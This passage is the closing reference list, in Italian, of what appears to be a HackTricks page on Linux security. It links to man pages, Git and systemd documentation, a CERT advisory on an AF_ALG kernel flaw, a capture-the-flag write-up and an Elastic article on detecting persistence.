- [24] [Specifiche Desktop Entry](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Linguaggio Kconfig](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Makefile di Linux crypto](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001: vulnerabilità della page cache di AF_ALG nel kernel Linux](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) — pagina del manuale Linux](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [30] [0xdf — HTB: Nexus](https://0xdf.gitlab.io/2026/09/02/htb-nexus.html)
- [31] [Documentazione Git di `hash-object`](https://git-scm.com/docs/git-hash-object)
- [32] [Documentazione Git di `ls-tree`](https://git-scm.com/docs/git-ls-tree)
- [33] [Documentazione della configurazione Git](https://git-scm.com/docs/git-config)
- [34] [`openat2(2)` — pagina del manuale Linux](https://man7.org/linux/man-pages/man2/openat2.2.html)
- [35] [Documentazione dei generator di systemd](https://github.com/systemd/systemd/blob/main/man/systemd.generator.xml)
- [36] [Elastic Security Labs — Linux Detection Engineering: meccanismi di persistenza](https://www.elastic.co/security-labs/threat-command/primer-on-persistence-mechanisms)
{{#include ../../banners/hacktricks-training.md}}
